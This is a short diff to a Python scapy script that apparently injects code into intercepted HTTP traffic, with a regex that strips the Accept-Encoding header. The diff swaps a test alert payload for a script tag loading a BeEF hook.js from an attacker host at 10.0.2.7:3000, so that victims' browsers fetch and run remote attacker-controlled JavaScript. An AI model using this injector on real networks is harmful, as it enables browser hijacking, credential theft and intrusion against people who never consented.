@@ -5,7 +5,10 @@ import scapy.all as scapy
 import re
 
 regex_string = 'Accept-Encoding:.*?\\r\\n'
-injection_code = "<script> alert('test')</script>"
+
+beef = '<script src=http://10.0.2.7:3000/hook.js></script>'
+alert = "<script> alert('test')</script>"
+injection_code = beef
 
 def set_load(packet, load):
     packet[scapy.Raw].load = load
